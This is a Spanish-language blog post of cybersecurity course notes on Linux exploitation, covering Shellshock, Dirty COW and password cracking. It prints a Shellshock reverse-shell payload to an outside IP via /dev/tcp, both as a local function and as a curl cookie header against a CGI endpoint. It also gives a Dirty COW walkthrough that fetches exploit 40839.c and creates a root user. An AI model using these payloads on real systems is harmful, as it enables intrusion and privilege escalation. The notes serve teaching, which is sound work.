---
layout: post
title: "Mi primer post sobre ciberseguridad"
date: 2024-12-25
---

# Técnicas Básicas de Explotación en Linux

Bloque : Bloque 2
Unit: Unidad 6
Date: 16/10/2024

---

# Introducción a los sistemas operativos basado en Linux

## El Kernel de Linux

## Procesos y ficheros

## Variables

# Vulnerabilidades de Kernel

<aside>
✖️

El Kernel en Linux es código escrito en C 

</aside>

Nos centraremos en otras vulnerabilidades que “no requieran de este proceso” para explotarlas. Si una vulnerabilidad está presente en el Kernel, probablemente se dé en todos los Sistemas Operativos que se basen en él.

## Shellshock

<aside>
✖️

CVE-2014-6271 → presente en las versiones de Bash anteriores a la 4.3

- Explotable a nivel local y en remoto
- Permite RCE(Remote Code Execution) por lo que afecta a los tres pilares
- Se basa en explotar las variables de entorno
</aside>

Creamos una variable llamada `testvar` en nuestra Shell, podemos recuperar siempre su valor. Sin embargo si creamos un proceso hijo Bash, no estará disponible.

Para que perdure, deberíamos declararla de manera global y exportarla.

Igual que se definen y se exportan las variables, también se pueden exportar funciones. Por ejemplo una función $x$ que haga echo de la cadena de caracteres $\texttt{shellshock}$.

```bash
x() { echo 'shellshock'} # Definimos la variable
x # La llamamos y nos devuelve shellshock
export -f x # Lo exportamos de manera global
bash # Ejecutamos proceso hijo
x # Nos devuelve shellshock
```

```bash
export testfunc='() { echo "shellshock"; }' # Declaramos la variable y la mostramos
echo $testfunc

testfunc
bash: No such file or directory # Al ejecutarlo vemos que no puede

bash # Creamos una Shell hija se importan todas las funciones y variables golbales
testfunc # Aquí si que vemos que la salida es shellshock
```

Ahora si que si, creamos el script malicioso para obtener acceso.

```bash
export revshell='() {bash -i& /dev/tcp/10.10.14.172/1234 0>&1; }'
echo revshell # La salida sería bash -i& /dev/tcp/10.10.14.172/1234 0>&1
bash # Nos metemos en una Shell hija, exportando la función revshell
revshell # Escuchando con netcat, obtendríamos acceso a la máquina
```

Todo esto es de manera local, para explotarlo en remoto, necesitaríamos un servidor vulnerable en este servicio además de una versión bash vulnerable.

- Ej: un Apache con CGI habilitado utiliza bash para procesar las peticiones

Con la siguiente petición HTTP

```bash
curl -H 'Cookie: () { :;}; /bin/bash -i& /dev/tcp/10.10.14.172/1234 0>&1'
# Nos conectariamos a http://10.129.169.110/cgi-bin/user.sh
```

Al lanzar esta petición, el servidor apache coge esa cookie y se la pasa al script sh, conseguimos una reverse shell.

## Dirty Cow

<aside>
✖️

CVE-2016-5195 → presente en las versiones de Kernel desde la 2.6.22 hasta la versión 4.8.3

- Explotable a nivel local
- Permite elevar privilegios de una máquina vulnerada (actuar como root) por lo que afecta a los tres pilares
- Aprovecha la forma que tiene el Kernel de gestionar un tipo de operación en la memoria del sistema (**C**opy-**O**n-**W**rite)
</aside>

Una condición de carrera se da cuando el restultado de un proceso depende de una secuencia de eventos ques se ejecutan en orden arbitrario y utilizan un recurso compartido. 

> Mientras yo ejecuto el LOL, hay una hebra que está ejecutando algo del sistema operativo, archivos temporales, las pestañas de chrome.
Aunque para nosotros es secuencial, los procesos del ordenador se “pelean” entre sí para obtener recursos. El Kernel es quién decide que debe ejecutarse a que tiempo.
> 

Para hacer una suma, se ejecuta la suma en paralelo, se le asigna unos hilos y una parte de la memoria, como los hilos entran en cualquier momento, existen problemas

| Thread 1 | Thread 2 |  | Valor en memoria |
| --- | --- | --- | --- |
|  |  |  | 0 |
| leer valor |  | ← | 0 |
| valor +1 |  |  | 0 |
| escribir |  | →  | 1 |
|  | leer valor | ← | 1 |
|  | valor +1 |  | 1 |
|  | escribir | →  | 2 |

Existe una venta de tiempo entre que se chequea un valor y se modifica (TOCTOU) En esa ventana de tiempo puede darse una condición de carrera.

El **PROBLEMA** viene cuando distintos hilos tienen asignados la misma memoria.

Para evitar estas condiciones de carrera, debemos de tener cuidado las secciones criticas del programa. 

- Tal y como funciona la jerarquía de memoria, cuando un usuario quiere leer o escribir en un fichero (almacenado en el disco duro o memoria virtual) se trae a la memoria principal.
- Las lecturas/escrituras se realizan en la copia que hay en memoria principal
- Se aplica la técnica de gestión de recursos **C**opy**-o**n-**w**rite (COW)

---

Imaginemos que tenemos acceso inicial de la máquina

Ahora queremos elevar privilegios para poder impersonar a root en el sistema.

Chequeamos la versión del Kernel de la máquina 

```bash
uname -a
# Linux Valentine 3.2.0-23 (bastante inferior al parche)
```

Tenemos dos opciones, desarrollar y ejecutar nuestro código o utilizar uno desarrollado por la comunidad (PoC). En este caso usamos uno preexistente:

- Linux Exploit Suggester / Metasploit
- o la herramienta sherchsploit

```bash
searchsploit dirty cow
# Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' '' 
```

Vamos a modificar el etc/passwd sin que el quernel se de cuenta

```bash
searchsploit -m /exploits/linux/local/40839.c
scp -i hype_key_decrypted ./40839.c hype@10.129.139..237:/home/hype40839.c
# Aquí veremos ya en la maquina víctima
# Lo compilamos con gcc -theads
chmod # Le damos permisos 
./exploit
# Aquí ya se ha copiado el /etc/passwd, nos pide una nueva contraseña.
# Con esto conseguimos crear un nuevo usuario sin que el kernel se de cuenta
```

Si miramos el fichero `etc/passwd`, tenemos el nuevo usuario creado, pudiendo ejecutarse como `root` si nos identificamos, vemos que tenemos el `uid=0` y `gid=0` en el grupo root.

https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html

## Otras técnicas

Los ficheros de Kernel tienen extensiones `.o` o `.ok`

# Ataques a contraseñas

Una técnica habitual en sistemas operativos de tipo Linux es la que implica atacar las contraseñas de cuentas locales.

Existen diferentes enfoques para realizar ataques a contraseñas:

- Comprometer una contraseña ya sea a través de ingeniería social, malware, captura de tráfico…
- Adivinar o romper una contraseña: fuerza bruta, ataque de diccionario, ataques dirigidos…
- Comprometer todas las contraseñas del sistema a través del fichero que las almacena y romper su sistema de cifrado.

## Tipos de ataques

- **Fuerza bruta:** consiste en probar todas las combinaciones posibles de letras, números y caracteres especiales, incrementando la longitud de la cadena que se prueba en cada interacción.
    - Si conocemos la política de contraseñas, comenzando por la longitud mínimo de contraseña (hash masks)
- **Ataque de diccionario:** consiste en reducir el espacio de búsqueda de la fuerza bruta utilizando palabras que aparecen en el diccionario/wordlist
    - RockYou, **Kaonashi** o [**SecList**](https://github.com/danielmiessler/SecLists)

En el `etc/shadow`, encontramos el hash de contraseña. Los campos con asteriscos `*` , indica que el usuario está deshabilitado. `!` o `!!` la cuenta está bloqueada.

<aside>
❗

En la actualidad la mayor parte de sistemas limitan el número de intentos de login que se pueden realizar antes de bloquear una cuenta.

No se suelen utilizar técnicas de adivinación de manera on-line

Se busca atacar las contraseñas de manera off-line

Esto se consigue con un *sniffer* accediendo al `etc/passwd` o `etc/shadow` y *crackearlas.*

</aside>

- Para crackear una contraseña, que normalmente se encuentra *hasheada* (no cifrada) se utilizan las técnicas ya vistas.
- También se puede optar por recurrir a *rainbow tables*. (Estructuras de datos)
    - Tablas de varios GB de información en la que se almacenan contraseñas y sus hashes correspondientes (aunque de una manera un poco especial, de manera que no ocupe mucho y que sea eficiente). Reduce mucho los tiempos de crackeo.
- Están en desuso, [**salt:** le añades algo por delante o por detrás a la contraseña]

Forcram (da miendo cambiarse, de un sistema, la gente que sabía Forcram vuelve de su jubilación para reparar cosas)

## Herramientas (John the Ripper, hashcat, rainbowcrack…)

> *Hashcat* → mejor porque usa la GPU
> 

Existen herramientas más concretas para generar una wordlist de un usuario concreto. La herramienta CUPP (Common User Password Profiler)

Lo habitual es comenzar por una primera iteración en la que se suelen recuperar las contraseñas más sencillas de *crackear* (por ser las más frecuentes las más cortas, las que son una palabra del diccionario, etc.) 

Si es necesario se continúan realizando iteraciones para crackear las más complicadas

En estos casos, la aceleración por hardware (aprovechando el alto grado de paralelismo que suelen tener las tareas asociadas a la rotura de contraseñas) puede reducir bastante los tiempos para conseguir resultados.

Se puede utilizar todos los núcleos de un procesador potente para realizar las tareas de crackeo en paralelos, con GPU sobre todos.

También hemos estudiado cómo enumerar los puertos que una ma quina tiene abierto y que servicios están a la escucha en esos puertos, en qué versiones, que vulnerabilidades presentan etc.

Servicios comunes como FTP, SSH o SMB se usan contraseñas por defecto o débiles por lo que es una técnica rentable en cuanto a esfuerzo y recursos.

Para atacar este tipo de servicios usamos **Ncrack** o **hidra**.

La navaja de _______ empezar por lo fácil, y luego escalando a lo complicado.